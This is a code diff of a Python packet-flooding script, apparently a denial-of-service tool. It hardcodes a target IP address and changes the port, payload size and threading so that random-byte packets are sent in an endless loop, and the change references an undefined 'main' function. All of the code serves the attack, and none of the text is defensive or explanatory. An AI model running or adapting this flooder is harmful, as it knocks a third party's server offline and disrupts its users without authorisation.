@@ -4,16 +4,17 @@ import threading
 import sys
 import argparse
 from scapy.all import *
-import time
+from multiprocessing.dummy import Pool as ThreadPool
+
 
 
 ip = '82.200.161.178'
-port = 80
-choice = '2'
-times = 100000000000000000000000
-threads = 100
+port = 123
+choice = '1'
+times = 10000000000
+threads = 10
 def run():
-	data = random._urandom(10*1024)
+	data = random._urandom(1024)
 	i = random.choice(("[/]","[__]","[/]"))
 	while True:
 		try:
@@ -24,7 +25,6 @@ def run():
 			print(i +" Sent!!!")
 		except:
 			print("[!] Error!!!")
-
 
 def run2():
 	data = random._urandom(16)
@@ -52,8 +52,10 @@ def run3():
 
 for y in range(threads):
 	if choice == '1':
-		th = threading.Thread(target = run)
-		th.start()
+		pool = ThreadPool(100)
+		results = pool.map(main,[i for i in range(10000)])
+		pool.close()
+		pool.join()
 
 	elif choice == '2':
 		th = threading.Thread(target = run2)
